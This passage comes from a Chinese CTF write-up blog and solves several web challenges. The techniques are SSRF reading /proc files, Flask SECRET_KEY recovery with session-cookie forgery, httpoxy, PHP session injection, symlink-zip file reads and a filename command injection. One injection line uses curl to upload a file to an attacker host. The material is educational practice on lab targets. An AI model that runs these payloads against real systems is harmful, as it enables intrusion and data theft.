unlink(<span class="variable">$newfile</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>关键之处在于</p>
<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">$picdata = <span class="keyword">system</span>(<span class="string">&quot;cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&quot;</span>.$filename.<span class="string">&quot; | base64 -w 0&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>命令执行，我们传个文件名为<code>123.php;cd ..;cat flag</code>的文件即可得到flag</p>
<h2 id="CISCN2019-华东南赛区-Web4"><a href="#CISCN2019-华东南赛区-Web4" class="headerlink" title="[CISCN2019 华东南赛区]Web4"></a>[CISCN2019 华东南赛区]Web4</h2><p>知识点：</p>
<ol>
<li>uuid_getnode</li>
<li>session</li>
<li>ssrf</li>
</ol>
<p>在buu上复现的，方法对了，但是不知道为什么不出flag，<del>导致死磕了很久，一直以为是自己方法错了</del></p>
<p>进入环境，点进去之后，发现跳转到baidu，很明显SSRF</p>
<p>fuzz后发现 file://等被过滤了，直接上 /proc/self/cmdline</p>
<blockquote>
<p>/usr/local/bin/python/app/app.py</p>
</blockquote>
<p>那就SSRF下app.py,得到代码如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> re, random, uuid, urllib</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(random.random()*<span class="number">233</span>)</span><br><span class="line">app.debug = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    session[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;www-data&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World! &lt;a href=&quot;/read?url=https://baidu.com&quot;&gt;Read somethings&lt;/a&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/read&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>():</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url = request.args.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">        m = re.findall(<span class="string">&#x27;^file.*&#x27;</span>, url, re.IGNORECASE)</span><br><span class="line">        n = re.findall(<span class="string">&#x27;flag&#x27;</span>, url, re.IGNORECASE)</span><br><span class="line">        <span class="keyword">if</span> m <span class="keyword">or</span> n:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;No Hack&#x27;</span></span><br><span class="line">        res = urllib.urlopen(url)</span><br><span class="line">        <span class="keyword">return</span> res.read()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> ex:</span><br><span class="line">        <span class="built_in">print</span> <span class="built_in">str</span>(ex)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;no response&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/flag&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flag</span>():</span></span><br><span class="line">    <span class="keyword">if</span> session <span class="keyword">and</span> session[<span class="string">&#x27;username&#x27;</span>] == <span class="string">&#x27;fuck&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&#x27;/flag.txt&#x27;</span>).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Access denied&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(</span><br><span class="line">        debug=<span class="literal">True</span>,</span><br><span class="line">        host=<span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">    )</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>只有满足存在session，且<code>session[&#39;username&#39;] == &#39;fuck&#39;</code>即可得到flag,想要伪造session,需要SECRET_KEY</p>
<p><strong>对全部的源码进行分析了，直接查找所需的<code>SECRET_KEY</code>的值发现：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(random.random()*<span class="number">233</span>)</span><br></pre></td></tr></table></figure>
<p><strong>其对<code>SECRET_KEY</code>做了<code>random</code>随机处理，但<code>random</code>生成的随机数都是伪随机数，有一定的规律。</strong><br><strong>发现了其中：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">random.seed(uuid.getnode())</span><br></pre></td></tr></table></figure>
<p><strong><code>random.seed()</code>方法改变随机数生成器的种子，<a href="https://www.jianshu.com/p/551a95290645">Python之random.seed()用法</a></strong><br><strong><code>uuid.getnode()</code>方法以<code>48</code>位正整数形式获取硬件地址，也就是服务器的MAC地址</strong></p>
<p><strong>若获取了服务器的MAC地址值，那么就可以构造出为伪随机的种子值，想到Linux中一切皆文件，查找到MAC地址存放在<code>/sys/class/net/eth0/address</code>文件中，读取该文件：得到其十六进制所表示的MAC地址</strong></p>
<p>然后脚本把它转换为10进制数，然后转换成SECRET_KEY</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line">mac=<span class="string">&quot;02:42:ac:10:a4:ef&quot;</span></span><br><span class="line">random.seed(<span class="built_in">int</span>(mac.replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;&quot;</span>), <span class="number">16</span>))</span><br><span class="line">key = <span class="built_in">str</span>(random.random() * <span class="number">233</span>)</span><br><span class="line">print(key)</span><br></pre></td></tr></table></figure>
<p>然后利用flask-session-cookie-manager进行伪造即可，然后将得到的伪session代替原session，访问/flag，即可得到flag    ,<del>迷惑的地方就是这里，我拿伪造的session进到/flag页面，一直给我回显Access denied</del></p>
<h2 id="V-amp-N2020-公开赛-TimeTravel"><a href="#V-amp-N2020-公开赛-TimeTravel" class="headerlink" title="[V&amp;N2020 公开赛]TimeTravel"></a>[V&amp;N2020 公开赛]TimeTravel</h2><p>知识点：httpoxy</p>
<p>要哭了，看着wp搞了一天，结果最后还是没出flag，这里记录下过程</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span> . <span class="string">&#x27;/vendor/autoload.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">GuzzleHttp</span>\<span class="title">Client</span>;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$client</span> = <span class="keyword">new</span> Client();</span><br><span class="line">    <span class="variable">$response</span> = <span class="variable">$client</span>-&gt;get(<span class="string">&#x27;http://127.0.0.1:5000/api/eligible&#x27;</span>);</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$response</span>-&gt;getBody();</span><br><span class="line">    <span class="variable">$data</span> = json_decode(<span class="variable">$content</span>, <span class="literal">TRUE</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$data</span>[<span class="string">&#x27;success&#x27;</span>] === <span class="literal">true</span>) &#123;</span><br><span class="line">      <span class="keyword">echo</span> system(<span class="string">&#x27;/readflag&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;phpinfo&#x27;</span>])) &#123;</span><br><span class="line">    phpinfo();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>?phpinfo</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu49.jpg"></p>
<p>满足success===true，就回显flag </p>
<p><strong>通过google搜索GuzzleHttp vuln ,可以发现有个httpoxy的漏洞，考点就是这里<a href="https://httpoxy.org/" target="_blank">https://httpoxy.org/</a></strong></p>
<blockquote>
<p><strong>在CGI(RFC 3875)的模式的时候， 会把请求中的Header， 加上HTTP_ 前缀， 注册为环境变量, 所以如果你在Header中发送一个Proxy:xxxxxx, 那么PHP就会把他注册为HTTP_PROXY环境变量， 于是getenv(“HTTP_PROXY”)就变成可被控制的了. 那么如果你的所有类似的请求， 都会被代理到攻击者想要的地址，之后攻击者就可以伪造，监听，篡改你的请求了</strong></p>
</blockquote>
<p><strong>利用条件：</strong></p>
<ul>
<li><strong>代码以cgi模式运行，其中使用环境变量<code>HTTP_PROXY</code></strong></li>
<li><strong>信任 HTTP 客户端<code>HTTP_PROXY</code>并将其配置为代理</strong></li>
<li><strong>在请求处理程序中使用的该客户端发出HTTP（与HTTPS相对）请求</strong></li>
</ul>
<p><strong>受影响范围</strong></p>
<table>
<thead>
<tr>
<th><strong>Language</strong></th>
<th><strong>Environment</strong></th>
<th><strong>HTTP client</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>PHP</strong></td>
<td><strong>php-fpm<br>mod_php</strong></td>
<td><strong>Guzzle 4+<br>Artax</strong></td>
</tr>
<tr>
<td><strong>Python</strong></td>
<td><strong>wsgiref.handlers.CGIHandler<br>twisted.web.twcgi.CGIScript</strong></td>
<td><strong>requests</strong></td>
</tr>
<tr>
<td><strong>Go</strong></td>
<td><strong>net/http/cgi</strong></td>
<td><strong>net/http</strong></td>
</tr>
</tbody></table>
<p><strong>Guzzle<code>&gt;=4.0.0rc2,&lt;6.2.1</code>版本受此影响</strong></p>
<p>刚开始一直在用buu内网vps进行复现，搞了好几个小时，一直连不上nc，后来在群里问了才知道，buu内网已经做隔离了，要直接访问外网资源，意思就是说直接拿自己的服务器搭呗</p>
<p>创建一个伪造的response  b.txt</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>nginx/1.14.2</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Mon, 08 Feb 2021 09:09:21 GMT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=UTF-8</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>Keep-alive</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>16</span><br><span class="line"></span><br><span class="line">&#123;&quot;success&quot;:true&#125;</span><br></pre></td></tr></table></figure>
<p>然后nc监听</p>
<blockquote>
<p>nc -lvp  2333 &lt; b.txt</p>
</blockquote>
<p><del>问题就在这里，不管我怎么连，就是连不上</del></p>
<p>最后在burp改包</p>
<p>加一行</p>
<blockquote>
<p>Proxy:xxx.xxx.xxx.xxx:2333</p>
</blockquote>
<p>然后就会返回flag</p>
<h2 id="HarekazeCTF2019-Easy-Notes"><a href="#HarekazeCTF2019-Easy-Notes" class="headerlink" title="[HarekazeCTF2019]Easy Notes"></a>[HarekazeCTF2019]Easy Notes</h2><p>知识点：session伪造</p>
<p>知道可以写note，然后可以下载，还知道要admin才可以getflag，session伪造，不过仅限于此猜测是，没什么思路，看了WP才知道，还有源码的存在，下载下来，源码比较简单，主要的代码如下</p>
<p>在export.php中 <code>$filename</code> 由三个参数拼接构成，<del>一般拼接点都是可利用的</del></p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu50.jpg"></p>
<p>我们全局搜索下 get_suer()的作用，可以发现为我们登入时使用的user<img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu51.jpg"></p>
<p>再看下session的存储位置，发现和文件的存储位置是一样的<img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu52.jpg"></p>
<p>思路很明显了，伪造session.不过在伪造session之前需要知道session处理器，默认为php</p>
<blockquote>
<p>当 <strong>session.serialize_handler=php</strong> 时，session文件内容为： <code>name|s:7:&quot;mochazz&quot;;</code></p>
</blockquote>
<p>做法：</p>
<p>用户名为<code>sess_</code>登入，然后写Note,标题为 <code>|N;admin|b:1;</code>,这样反序列化结果即可为：<code>admin==bool(true)</code> , 最后<code>export.php?type=.</code>即可使得这个<code>.</code>与前面的<code>.</code>拼接成<code>..</code>被替换为空，<code>$filename</code>也就成为了session文件名了</p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu53.jpg"></p>
<p>然后修改session，到getflag页面即可得到flag，（不过这里我修改完session,点getflag后并没有flag,需要先到别的页面，再到getflag）</p>
<h2 id="SWPU2019-Web3"><a href="#SWPU2019-Web3" class="headerlink" title="[SWPU2019]Web3"></a>[SWPU2019]Web3</h2><p>知识点：软链接读文件</p>
<p>随意输入都能登录，登入后查看源码有一处注释可疑</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">404 not found</span></span><br><span class="line"><span class="comment">--&gt;</span>Copy</span><br></pre></td></tr></table></figure>
<p>随便输入访问到404页面，放到burp查看相应包</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Swpuctf_csrf_token</span>: U<span class="number">0</span>VDUkVUX<span class="number">0</span>tFWTprZXlxcXF<span class="number">3</span>d<span class="number">3</span>dlZWUhQCMkJV<span class="number">4</span>mKg==</span><br></pre></td></tr></table></figure>
<p>base64解密为 SECRET_KEY:keyqqqwwweee!@#$%^&amp;*</p>
<p>脚本直接伪造admin</p>
<figure class="highlight csp"><table><tr><td class="code"><pre><span class="line">python3 flask_session_cookie_manager3.py decode -c <span class="string">&#x27;eyJpZCI6eyIgYiI6Ik1UQXcifSwiaXNfbG9naW4iOnRydWUsInBhc3N3b3JkIjoicSIsInVzZXJuYW1lIjoiMTIzIn0.Xo3RYQ.WSpp6_ZvPfQfdlnAX3ZbtSnEOS0&#x27;</span> -s <span class="string">&#x27;keyqqqwwweee!@#$%^&amp;*&#x27;</span></span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&#x27;id&#x27;</span>: b<span class="string">&#x27;100&#x27;</span>, <span class="string">&#x27;is_login&#x27;</span>: True, <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;123&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">将id:100改为1</span><br><span class="line"></span><br><span class="line">python3 flask_session_cookie_manager3.py encode -s <span class="string">&#x27;keyqqqwwweee!@#$%^&amp;*&#x27;</span> -t &quot;&#123;<span class="string">&#x27;id&#x27;</span>: b<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;is_login&#x27;</span>: True, <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;123&#x27;</span>&#125;&quot;</span><br><span class="line"></span><br><span class="line">eyJpZCI6eyIgYiI6Ik1RPT0ifSwiaXNfbG9naW4iOnRydWUsInBhc3N3b3JkIjoicSIsInVzZXJuYW1lIjoiMTIzIn0.Xo3SLw.lL3TAbVjmsDo65DOZhUNjrM8hkc</span><br></pre></td></tr></table></figure>
<p>成功到上传界面，源码有注释</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span>():</span></span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&#x27;id&#x27;</span>] != <span class="string">b&#x27;1&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template_string(temp)</span><br><span class="line">    <span class="keyword">if</span> request.method==<span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        m = hashlib.md5()</span><br><span class="line">        name = session[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        name = name+<span class="string">&#x27;qweqweqwe&#x27;</span></span><br><span class="line">        name = name.encode(encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        m.update(name)</span><br><span class="line">        md5_one= m.hexdigest()</span><br><span class="line">        n = hashlib.md5()</span><br><span class="line">        ip = request.remote_addr</span><br><span class="line">        ip = ip.encode(encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        n.update(ip)</span><br><span class="line">        md5_ip = n.hexdigest()</span><br><span class="line">        f=request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">        basepath=os.path.dirname(os.path.realpath(__file__))</span><br><span class="line">        path = basepath+<span class="string">&#x27;/upload/&#x27;</span>+md5_ip+<span class="string">&#x27;/&#x27;</span>+md5_one+<span class="string">&#x27;/&#x27;</span>+session[<span class="string">&#x27;username&#x27;</span>]+<span class="string">&quot;/&quot;</span></span><br><span class="line">        path_base = basepath+<span class="string">&#x27;/upload/&#x27;</span>+md5_ip+<span class="string">&#x27;/&#x27;</span></span><br><span class="line">        filename = f.filename</span><br><span class="line">        pathname = path+filename</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;zip&quot;</span> != filename.split(<span class="string">&#x27;.&#x27;</span>)[-<span class="number">1</span>]:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;zip only allowed&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path_base):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                os.makedirs(path_base)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                os.makedirs(path)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(pathname):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                f.save(pathname)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            cmd = <span class="string">&quot;unzip -n -d &quot;</span>+path+<span class="string">&quot; &quot;</span>+ pathname</span><br><span class="line">            <span class="keyword">if</span> cmd.find(<span class="string">&#x27;|&#x27;</span>) != -<span class="number">1</span> <span class="keyword">or</span> cmd.find(<span class="string">&#x27;;&#x27;</span>) != -<span class="number">1</span>:</span><br><span class="line">				waf()</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span></span><br><span class="line">            os.system(cmd)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span></span><br><span class="line">        unzip_file = zipfile.ZipFile(pathname,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">        unzip_filename = unzip_file.namelist()[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> session[<span class="string">&#x27;is_login&#x27;</span>] != <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;not login&#x27;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> unzip_filename.find(<span class="string">&#x27;/&#x27;</span>) != -<span class="number">1</span>:</span><br><span class="line">                shutil.rmtree(path_base)</span><br><span class="line">                os.mkdir(path_base)</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span></span><br><span class="line">            image = <span class="built_in">open</span>(path+unzip_filename, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">            resp = make_response(image)</span><br><span class="line">            resp.headers[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&#x27;image/png&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> resp</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            shutil.rmtree(path_base)</span><br><span class="line">            os.mkdir(path_base)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;upload.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/showflag&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">showflag</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="literal">True</span> == <span class="literal">False</span>:</span><br><span class="line">        image = <span class="built_in">open</span>(os.path.join(<span class="string">&#x27;./flag/flag.jpg&#x27;</span>), <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">        resp = make_response(image)</span><br><span class="line">        resp.headers[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&#x27;image/png&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> resp</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;can&#x27;t give you&quot;</span></span><br></pre></td></tr></table></figure>
<p>定义两个路由,上传的那个路由就是上传一个压缩的图片,服务器进行解压再显示图片,我们这里可上传一个软连接压缩包,来读取其他文件,showflag路由告诉我们flag.jpg放在/flag/flag.jpg</p>
<blockquote>
<p><strong>ln -s是Linux的一种软连接,类似与windows的快捷方式</strong><br><strong>ln -s /etc/passwd forever404 这会出现一个forever404文本,里面包含密码</strong><br><strong>/proc/self 记录了系统运行的信息状态等,cwd 指向当前进程运行目录的一个符号链接,即flask运行进程目录</strong></p>
</blockquote>
<p><strong>软链接读文件，关键在于怎么获取到flag.jpg绝对路径</strong></p>
<p><strong>在 linux 中，<code>/proc/self/cwd/</code>会指向进程的当前目录，那么在不知道 flask 工作目录时，我们可以用<code>/proc/self/cwd/flag/flag.jpg</code>来访问 flag.jpg</strong></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">ln -s <span class="regexp">/proc/</span>self<span class="regexp">/cwd/</span>flag/flag.jpg qwe</span><br><span class="line">zip -ry qwe.zip qweCopy</span><br></pre></td></tr></table></figure>
<p><strong><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu54.jpg"></strong></p>
<p><strong>或者先找到当前目录路径</strong></p>
<p><strong>在 linux 中，<code>/proc/self/environ</code>文件里包含了进程的环境变量，可以从中获取 flask 应用的绝对路径，再通过绝对路径制作软链接来读取 flag.jpg (PS：在浏览器中，我们无法直接看到<code>/proc/self/environ</code>的内容，只需要下载到本地，用 notepad++打开即可)</strong></p>
<figure class="highlight tcl"><table><tr><td class="code"><pre><span class="line">ln -s /<span class="keyword">proc</span>/self/environ<span class="title"> qqq</span></span><br><span class="line"><span class="title"></span> <span class="title">  zip</span> -ry<span class="title"> qqq.zip</span> qqq</span><br><span class="line">ln -s /ctf/hgfjakshgfuasguiasguiaaui/myflask/flag/flag.jpg<span class="title"> www</span></span><br><span class="line"><span class="title"></span> <span class="title">  zip</span> -ry<span class="title"> www.zip</span> wwwCopy</span><br></pre></td></tr></table></figure>
<p><strong>将得到的压缩包上传，抓包查看response，即可得到flag</strong></p>
<p><strong>也可以命令注入：</strong></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$</span>(III=`awk <span class="string">&#x27;BEGIN&#123;printf \&quot;%c\&quot;, 47&#125;&#x27;</span>`&amp;&amp;<span class="built_in">curl</span> xxx.xxx.xxx.xxx:<span class="number">9999</span> <span class="literal">-T</span> `echo <span class="variable">$</span>&#123;III&#125;ctf<span class="variable">$</span>&#123;III&#125;hgfjakshgfuasguiasg</span><br></pre></td></tr></table></figure>


<h2 id="FireshellCTF2020-Caas"><a href="#FireshellCTF2020-Caas" class="headerlink" title="[FireshellCTF2020]Caas"></a>[FireshellCTF2020]Caas</h2><p><strong>知识点：</strong></p>
<ol>
<li><code>#include &#39;&#39;</code>预处理编译报错</li>
<li>文件包含</li>
</ol>
<p>首先随便输了个php代码，根据报错发现是<strong>C</strong>语言编译器</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello, World! \n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>编译后下载了一个文件.猜测flag应该是以文件形式存在服务器中，尝试使用<code>#include &#39;&#39;</code>预处理命令</p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu55.jpg"></p>
<h2 id="NESTCTF-2019-Love-Math-2"><a href="#NESTCTF-2019-Love-Math-2" class="headerlink" title="[NESTCTF 2019]Love Math 2"></a>[NESTCTF 2019]Love Math 2</h2><p>知识点：WAF绕过</p>
<p>和国赛那题一样，就是范围变了下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen(<span class="variable">$content</span>) &gt;= <span class="number">60</span>) &#123;    <span class="comment">//国赛的范围是80</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;太长了不会算&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$content</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    <span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span 